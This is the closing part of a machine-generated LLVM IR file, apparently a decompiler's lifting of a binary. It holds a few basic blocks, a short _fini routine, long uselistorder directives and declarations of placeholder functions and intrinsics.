dec_label_pc_1acd8:                               ; preds = %dec_label_pc_1acb4, %entry
  ret i32 0

dec_label_pc_1ace0:                               ; preds = %dec_label_pc_1acac
  %v4_1ace0 = mul i32 %arg2, 4096
  %v5_1ace0 = or i32 %v4_1ace0, %arg1
  %v7_1ace0 = icmp eq i32 %v5_1ace0, 0
  br i1 %v7_1ace0, label %dec_label_pc_1ace8, label %dec_label_pc_1acf0

dec_label_pc_1ace8:                               ; preds = %dec_label_pc_1ace0, %dec_label_pc_1acb8
  ret i32 -1

dec_label_pc_1acf0:                               ; preds = %dec_label_pc_1ace0
  ret i32 0

; uselistorder directives
  uselistorder i32 -1, { 0, 44, 278, 185, 186, 47, 48, 45, 46, 187, 49, 1, 188, 189, 190, 191, 2, 192, 193, 3, 4, 194, 86, 195, 87, 327, 167, 329, 88, 330, 149, 297, 331, 332, 5, 89, 333, 334, 196, 197, 146, 198, 155, 90, 6, 199, 343, 76, 77, 344, 200, 150, 201, 152, 202, 7, 203, 154, 153, 345, 346, 66, 67, 68, 69, 71, 78, 8, 9, 74, 279, 10, 11, 12, 92, 96, 91, 93, 143, 144, 97, 95, 94, 168, 280, 98, 337, 99, 298, 204, 299, 300, 281, 282, 283, 100, 284, 285, 347, 348, 205, 50, 51, 301, 206, 84, 52, 207, 302, 53, 13, 54, 208, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 209, 338, 340, 210, 101, 303, 212, 304, 305, 85, 79, 80, 306, 307, 308, 309, 310, 156, 102, 311, 157, 14, 211, 81, 82, 213, 312, 351, 352, 214, 169, 170, 313, 215, 216, 314, 315, 171, 328, 217, 16, 15, 218, 219, 17, 286, 220, 103, 386, 104, 105, 295, 106, 362, 75, 363, 107, 358, 108, 287, 109, 110, 356, 18, 111, 364, 365, 19, 221, 222, 223, 224, 366, 336, 173, 172, 112, 288, 73, 225, 113, 289, 226, 20, 227, 21, 228, 174, 367, 25, 229, 230, 24, 26, 368, 23, 231, 232, 55, 22, 233, 56, 57, 58, 59, 234, 235, 236, 70, 291, 292, 27, 357, 114, 349, 115, 116, 296, 117, 369, 118, 353, 119, 120, 294, 121, 350, 72, 237, 316, 238, 60, 61, 239, 240, 241, 242, 243, 122, 244, 245, 246, 175, 123, 247, 28, 248, 147, 124, 339, 249, 317, 250, 251, 318, 319, 62, 320, 321, 83, 322, 252, 253, 148, 158, 151, 323, 29, 254, 324, 255, 30, 63, 256, 64, 325, 342, 335, 176, 125, 359, 126, 388, 127, 341, 128, 129, 370, 130, 290, 131, 390, 132, 326, 133, 387, 134, 355, 135, 293, 136, 354, 137, 138, 139, 360, 140, 389, 141, 361, 257, 258, 142, 177, 259, 260, 261, 262, 35, 36, 37, 31, 32, 33, 34, 178, 179, 263, 264, 265, 38, 266, 267, 65, 39, 40, 145, 180, 181, 182, 41, 268, 269, 164, 165, 166, 42, 270, 159, 160, 161, 162, 163, 43, 271, 272, 273, 274, 275, 276, 277, 183, 184 }
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 23, 5, 6, 24, 7, 8, 9, 10, 25, 29, 11, 15, 32, 16, 12, 30, 19, 31, 17, 14, 26, 18, 20, 21, 27, 28, 13, 22 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 2, 18, 19, 20, 21 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 9, 14, 15, 8 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 181, 37, 38, 39, 161, 40, 41, 42, 43, 44, 197, 198, 199, 201, 202, 203, 94, 204, 45, 126, 205, 206, 207, 46, 127, 208, 209, 210, 123, 128, 213, 0, 216, 162, 163, 95, 129, 217, 130, 176, 47, 177, 218, 219, 220, 48, 182, 183, 184, 164, 200, 221, 222, 223, 224, 49, 50, 96, 97, 98, 239, 240, 114, 241, 242, 99, 243, 244, 214, 185, 93, 186, 187, 51, 52, 188, 189, 131, 132, 53, 175, 54, 100, 55, 56, 112, 178, 91, 57, 245, 113, 230, 58, 59, 231, 60, 61, 92, 211, 62, 63, 64, 212, 65, 66, 67, 68, 115, 232, 233, 69, 70, 1, 165, 234, 71, 235, 225, 72, 166, 2, 73, 74, 75, 101, 102, 103, 117, 104, 118, 105, 106, 133, 107, 109, 108, 110, 167, 168, 169, 190, 191, 124, 76, 77, 78, 79, 80, 125, 192, 119, 116, 81, 193, 194, 195, 215, 170, 82, 83, 84, 171, 85, 86, 87, 88, 89, 134, 179, 135, 136, 137, 138, 120, 180, 139, 140, 121, 141, 142, 143, 144, 145, 146, 148, 172, 147, 173, 151, 149, 150, 174, 160, 152, 196, 153, 154, 155, 226, 227, 228, 156, 229, 111, 157, 158, 159, 238, 122, 236, 90, 237 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1acfc = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1acfc)
  %v31_1ad04 = load i32, i32* @r0, align 4
  ret i32 %v31_1ad04

; uselistorder directives
  uselistorder i32* @r0, { 30, 211, 205, 206, 207, 208, 209, 210, 31, 28, 212, 90, 213, 5, 91, 214, 215, 89, 92, 216, 32, 29, 217, 218, 219, 220, 129, 33, 130, 131, 34, 35, 221, 222, 223, 224, 225, 226, 24, 227, 228, 36, 6, 275, 277, 111, 276, 2, 288, 287, 44, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 301, 302, 303, 315, 316, 317, 318, 319, 320, 321, 322, 114, 323, 132, 324, 325, 326, 328, 327, 14, 307, 229, 230, 133, 134, 37, 38, 39, 329, 330, 331, 332, 333, 40, 15, 42, 365, 16, 43, 17, 18, 279, 3, 280, 202, 203, 204, 7, 310, 46, 231, 232, 86, 87, 233, 234, 235, 88, 236, 237, 238, 47, 239, 240, 241, 242, 48, 66, 278, 281, 282, 283, 284, 285, 286, 49, 50, 135, 136, 137, 51, 52, 53, 54, 351, 345, 55, 366, 352, 368, 369, 119, 120, 121, 122, 123, 124, 125, 126, 56, 57, 58, 127, 128, 367, 300, 68, 271, 272, 273, 274, 138, 139, 354, 59, 117, 118, 355, 8, 356, 357, 358, 304, 112, 305, 306, 113, 70, 359, 360, 361, 362, 363, 346, 145, 60, 334, 41, 342, 67, 243, 244, 245, 61, 19, 62, 45, 309, 63, 246, 247, 248, 9, 10, 249, 250, 11, 13, 0, 1, 251, 252, 12, 253, 254, 255, 65, 109, 256, 257, 258, 259, 260, 64, 261, 20, 262, 263, 4, 264, 308, 140, 141, 142, 143, 144, 311, 312, 313, 314, 265, 266, 146, 340, 69, 147, 353, 148, 93, 149, 150, 151, 94, 152, 95, 96, 97, 98, 153, 154, 155, 156, 99, 100, 157, 158, 159, 160, 161, 101, 102, 103, 27, 23, 104, 162, 163, 164, 165, 166, 26, 22, 105, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 25, 21, 106, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 107, 200, 201, 108, 110, 267, 268, 269, 270, 335, 336, 337, 338, 339, 341, 343, 344, 347, 348, 349, 350, 115, 116, 364, 71, 72, 73, 74, 82, 83, 84, 85, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder void (i32)* @__pseudo_branch, { 15, 81, 82, 83, 33, 34, 44, 45, 46, 95, 41, 42, 43, 35, 16, 17, 18, 19, 20, 21, 100, 101, 102, 103, 104, 96, 87, 97, 98, 99, 0, 38, 39, 40, 22, 23, 24, 25, 26, 27, 84, 85, 86, 105, 106, 107, 88, 89, 90, 55, 56, 57, 91, 92, 93, 108, 64, 65, 66, 67, 68, 69, 70, 71, 72, 58, 59, 60, 61, 62, 63, 29, 30, 73, 74, 31, 32, 36, 37, 28, 75, 76, 77, 78, 79, 80, 47, 48, 49, 50, 51, 52, 53, 54, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 94 }
  uselistorder i32 0, { 0, 1581, 1, 1582, 1583, 1367, 435, 436, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 3, 4, 5, 1591, 1592, 2, 1593, 1594, 1368, 6, 1595, 1596, 34, 1369, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 106, 105, 218, 219, 220, 1605, 1606, 1607, 7, 1608, 1609, 35, 1610, 1611, 1612, 36, 37, 207, 1613, 1614, 1615, 1616, 38, 208, 447, 1617, 1618, 1619, 1620, 1621, 1622, 39, 1623, 9, 8, 40, 1370, 1624, 1372, 1371, 1625, 1626, 1627, 1628, 1629, 10, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1373, 1438, 1630, 1631, 1632, 1633, 1634, 11, 1635, 1374, 1636, 1637, 1638, 1639, 209, 210, 448, 1640, 1641, 13, 12, 1642, 1643, 1644, 1645, 1646, 1647, 1648, 1375, 1376, 1649, 1378, 1650, 1651, 1379, 1380, 1652, 1653, 1377, 1654, 1381, 1655, 1382, 1656, 1657, 1658, 1659, 14, 1847, 1848, 1849, 1850, 134, 1851, 221, 1852, 1853, 1854, 1855, 1856, 1857, 1858, 222, 1383, 1386, 1384, 1385, 1859, 1860, 1861, 1862, 1863, 1864, 1871, 1872, 54, 55, 1881, 1882, 1873, 1874, 1875, 1876, 1877, 1878, 1879, 1880, 1883, 1884, 1891, 1886, 1887, 1889, 1888, 1890, 112, 223, 1914, 1921, 224, 1922, 125, 1923, 126, 1924, 127, 1925, 128, 1926, 225, 1927, 1928, 1660, 1661, 1932, 1933, 226, 1934, 1935, 1936, 227, 1937, 1938, 86, 89, 90, 113, 1939, 87, 1940, 88, 1941, 1942, 1943, 145, 146, 1944, 1945, 1946, 228, 1947, 1948, 385, 1949, 1950, 449, 1951, 1952, 1953, 1954, 1955, 1956, 1957, 91, 1958, 1959, 114, 1974, 1975, 1976, 1977, 1978, 1979, 331, 1980, 1981, 1982, 1992, 1983, 2027, 2047, 2048, 2049, 1991, 147, 2050, 391, 381, 382, 450, 2051, 2052, 2053, 2055, 2056, 2057, 2058, 41, 2059, 2060, 56, 2061, 2062, 2063, 2064, 2067, 2068, 2069, 2070, 2071, 2072, 229, 2073, 2074, 1387, 2075, 2065, 2054, 1388, 328, 1389, 2066, 2076, 2077, 2078, 2079, 57, 2081, 58, 2080, 148, 2082, 2083, 230, 1439, 1440, 1441, 1442, 1443, 115, 1444, 1445, 231, 42, 232, 1446, 451, 1447, 383, 233, 234, 452, 453, 236, 2084, 2085, 2086, 2087, 2088, 237, 235, 454, 455, 2089, 2090, 2091, 2092, 238, 456, 2093, 457, 2094, 59, 60, 61, 62, 437, 239, 2095, 129, 2096, 241, 240, 458, 459, 135, 1993, 1994, 1995, 1996, 1997, 1662, 1663, 1664, 1665, 1666, 1667, 242, 107, 384, 1668, 1669, 1670, 92, 1998, 460, 1999, 2000, 2001, 149, 1671, 461, 1672, 1673, 1674, 1675, 1676, 1677, 392, 393, 1450, 1451, 1929, 1930, 394, 1931, 462, 1448, 463, 1449, 1457, 1458, 15, 150, 151, 252, 251, 244, 250, 249, 248, 245, 246, 247, 243, 1915, 1916, 1917, 1918, 464, 2097, 2098, 2099, 253, 2100, 2104, 2105, 2106, 2107, 2108, 254, 2109, 152, 2153, 2154, 2155, 2156, 255, 256, 2157, 1892, 1893, 1894, 332, 2254, 93, 333, 2258, 2259, 121, 63, 153, 1390, 1678, 64, 154, 1679, 1680, 334, 1552, 1553, 335, 65, 1895, 116, 257, 1554, 1555, 155, 1391, 337, 1681, 66, 122, 1682, 1683, 336, 2260, 2261, 2262, 2263, 2264, 2267, 2268, 2269, 2270, 2271, 2272, 2273, 2274, 2275, 2276, 2265, 2266, 2277, 2278, 2279, 2280, 2281, 2282, 2283, 2284, 43, 2285, 2286, 2287, 2288, 2289, 44, 2290, 2291, 2292, 45, 2293, 2294, 2295, 46, 2296, 2297, 2298, 2299, 2300, 2301, 2302, 2303, 2304, 2305, 2306, 2307, 2308, 2309, 2310, 2311, 2312, 2313, 2314, 2315, 2316, 2317, 2318, 2319, 2322, 2323, 2324, 2325, 2326, 2327, 2328, 2320, 2321, 2329, 2330, 2331, 2332, 2333, 2334, 2335, 2336, 2337, 2338, 47, 2339, 2340, 2341, 2342, 2343, 48, 2344, 2345, 2346, 2347, 2348, 49, 2349, 2350, 2351, 2352, 2353, 2354, 2355, 2356, 2357, 2358, 2359, 2360, 2361, 2362, 2363, 2002, 2003, 2019, 465, 466, 2020, 2021, 156, 1896, 1684, 1685, 1686, 1687, 1688, 259, 1689, 1690, 1691, 1692, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 1700, 158, 157, 260, 261, 1701, 1702, 1703, 1704, 1705, 1706, 159, 160, 1707, 1708, 1709, 1710, 1711, 1712, 50, 1713, 1714, 1715, 1716, 1717, 67, 262, 1718, 161, 468, 1719, 1720, 1721, 1722, 1723, 469, 263, 1724, 1725, 1726, 1727, 400, 1728, 1729, 1730, 399, 1731, 1732, 398, 1733, 1734, 258, 1735, 467, 1736, 265, 1737, 51, 1738, 395, 386, 1739, 1740, 1741, 470, 471, 1742, 1743, 1744, 396, 397, 1745, 1746, 1747, 264, 1748, 1749, 1750, 1751, 1752, 1753, 2137, 16, 2138, 2139, 2140, 1392, 2141, 2142, 2143, 2144, 2145, 2146, 1755, 1754, 1756, 1757, 1758, 1759, 1760, 1761, 1762, 1763, 1764, 1765, 1766, 1767, 1768, 1769, 162, 2004, 2005, 2006, 17, 2007, 338, 1771, 1770, 339, 1772, 1773, 163, 1774, 266, 268, 1919, 267, 1920, 269, 1885, 164, 1897, 1902, 1903, 1898, 1899, 1900, 1905, 1906, 1907, 270, 1908, 1909, 1910, 1911, 1912, 1901, 1904, 1913, 165, 1452, 1453, 1454, 271, 1455, 1456, 272, 1459, 1463, 1464, 1465, 1466, 273, 1460, 274, 1461, 1462, 166, 1467, 2364, 1984, 1570, 2182, 2183, 2184, 2185, 275, 2186, 2169, 1468, 2170, 2166, 167, 276, 2365, 2366, 2171, 2187, 2188, 168, 472, 2371, 2372, 473, 2373, 2374, 277, 341, 2375, 2376, 474, 94, 2377, 2378, 475, 2386, 2390, 1393, 340, 2391, 476, 2387, 2388, 2389, 2367, 2368, 1394, 278, 329, 1417, 18, 19, 477, 2172, 279, 1418, 1420, 1419, 280, 1421, 1422, 1423, 478, 1424, 140, 1483, 130, 1484, 282, 281, 1485, 169, 283, 2369, 2370, 1964, 1965, 1966, 1967, 1968, 1969, 285, 170, 1970, 1971, 1972, 131, 284, 1973, 479, 1469, 171, 1470, 172, 1471, 286, 1865, 1866, 1867, 20, 2114, 1472, 1473, 214, 215, 216, 132, 1474, 217, 173, 480, 481, 2381, 401, 174, 175, 2194, 2195, 2196, 2197, 2198, 287, 2199, 2200, 2201, 2202, 2203, 2204, 2205, 288, 2189, 482, 2190, 2191, 483, 2192, 2193, 176, 1985, 484, 289, 1986, 1987, 1988, 1989, 1990, 177, 2206, 2207, 293, 291, 292, 2208, 2209, 299, 298, 212, 290, 2210, 2211, 2212, 2213, 2214, 2215, 388, 387, 402, 485, 2216, 2217, 2218, 95, 2219, 295, 294, 296, 297, 211, 2220, 2221, 342, 2222, 2223, 141, 2224, 2225, 2226, 2227, 2228, 21, 22, 1486, 1487, 96, 178, 23, 403, 486, 2110, 2111, 1571, 2229, 2149, 2126, 1518, 2127, 2158, 2148, 300, 2147, 301, 2028, 302, 68, 303, 1775, 1776, 305, 1777, 1778, 304, 1779, 306, 179, 2255, 2256, 2257, 343, 2101, 2102, 2103, 307, 1780, 1781, 344, 1782, 142, 2115, 2116, 2117, 487, 24, 2392, 2393, 117, 308, 1783, 1784, 1785, 1786, 1787, 309, 2022, 1395, 2023, 2024, 180, 181, 182, 2008, 2009, 2017, 2014, 2015, 2016, 345, 380, 2018, 183, 2012, 2010, 2011, 346, 2013, 184, 1488, 1489, 185, 25, 186, 2025, 2026, 26, 27, 187, 28, 1490, 188, 29, 1788, 1789, 1790, 1791, 1792, 189, 1793, 1794, 1795, 1796, 1798, 1799, 1797, 1800, 190, 1801, 1804, 1802, 1803, 310, 488, 1805, 1806, 1807, 311, 312, 1808, 1809, 1810, 1811, 1812, 1813, 489, 1814, 1815, 490, 1816, 1818, 313, 1817, 347, 330, 1819, 1820, 1822, 191, 1823, 315, 1824, 100, 101, 98, 99, 1825, 491, 136, 133, 1826, 1827, 1828, 318, 316, 317, 492, 1829, 1830, 1831, 97, 314, 1832, 1833, 1834, 1835, 1836, 1837, 1838, 1839, 1840, 493, 137, 370, 108, 1841, 1842, 1843, 30, 319, 1425, 1426, 143, 102, 123, 1821, 348, 192, 1476, 1475, 350, 1478, 1477, 349, 1479, 1480, 494, 1481, 193, 2030, 2031, 2032, 103, 104, 2033, 2034, 2035, 320, 2036, 2037, 2038, 2039, 2040, 495, 2041, 2042, 2043, 2044, 2045, 1844, 2046, 194, 1960, 1961, 1962, 1963, 195, 31, 2173, 2382, 2379, 2029, 1491, 2230, 1482, 2385, 1868, 2380, 2174, 2164, 1492, 2150, 2124, 1493, 496, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 2175, 2383, 138, 2384, 2176, 32, 2231, 2232, 2233, 139, 2234, 2235, 2236, 2237, 2238, 321, 2239, 1396, 1399, 1397, 1398, 2240, 1400, 389, 503, 504, 351, 505, 1505, 502, 52, 53, 506, 1506, 1507, 507, 517, 518, 615, 616, 69, 404, 497, 213, 499, 500, 405, 501, 1508, 352, 196, 509, 510, 508, 1509, 1510, 1511, 1512, 1514, 371, 1513, 1515, 1516, 513, 514, 511, 512, 1517, 498, 515, 516, 322, 406, 353, 1520, 519, 1519, 523, 524, 520, 521, 522, 1521, 525, 1522, 438, 1523, 526, 1524, 527, 70, 124, 197, 198, 199, 407, 528, 408, 323, 1525, 1526, 534, 324, 1527, 1529, 535, 536, 325, 1528, 356, 1530, 537, 1531, 531, 1532, 1534, 532, 533, 1533, 355, 1535, 530, 538, 1536, 1537, 539, 1538, 1540, 540, 541, 1539, 354, 1541, 529, 542, 1542, 543, 1543, 544, 1544, 545, 1545, 1546, 1547, 546, 1548, 1549, 1550, 1551, 1556, 549, 71, 409, 1557, 1563, 548, 1558, 1559, 1560, 1561, 1562, 357, 1564, 550, 439, 1565, 1566, 547, 1567, 551, 1568, 1569, 200, 553, 374, 72, 372, 373, 1572, 144, 440, 1573, 554, 1574, 552, 1575, 555, 377, 73, 375, 376, 1576, 556, 1577, 1578, 557, 1579, 1580, 326, 558, 1845, 1846, 74, 109, 410, 560, 561, 559, 562, 1401, 1402, 574, 1403, 1404, 1405, 1406, 573, 1407, 1408, 1409, 1410, 572, 1411, 1412, 1413, 1414, 569, 570, 563, 571, 568, 358, 1415, 565, 1416, 566, 567, 1366, 1869, 75, 119, 1870, 411, 564, 76, 110, 118, 575, 576, 577, 412, 413, 414, 2112, 441, 2113, 120, 359, 327, 77, 78, 578, 415, 416, 417, 418, 585, 2118, 2120, 2121, 2122, 580, 2123, 581, 582, 583, 579, 360, 584, 2119, 442, 587, 588, 586, 419, 33, 590, 589, 591, 2125, 420, 421, 422, 423, 2128, 594, 592, 593, 361, 2129, 595, 2130, 443, 378, 2134, 2135, 424, 2131, 2132, 596, 597, 598, 2133, 600, 601, 602, 603, 604, 599, 362, 605, 2136, 606, 79, 612, 80, 611, 607, 2151, 610, 364, 613, 608, 2152, 609, 363, 614, 81, 111, 2159, 2160, 444, 2161, 2162, 201, 2163, 82, 445, 2165, 365, 617, 618, 619, 620, 2167, 2168, 390, 621, 2177, 2178, 622, 2179, 623, 2180, 2181, 624, 202, 625, 626, 627, 628, 629, 2251, 203, 83, 379, 366, 427, 428, 2241, 2242, 2243, 367, 425, 426, 429, 2244, 2245, 430, 2246, 2247, 369, 84, 204, 205, 368, 2249, 2250, 446, 206, 85, 630, 2248, 2252, 2253, 431, 432, 1427, 433, 434, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 2394, 2395, 2396, 2397, 2398, 2399, 2400, 2401, 2402, 2403, 2404, 2405, 2406, 2407, 2408 }
  uselistorder i32* @r4, {}
}

declare i32 @unknown_0() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
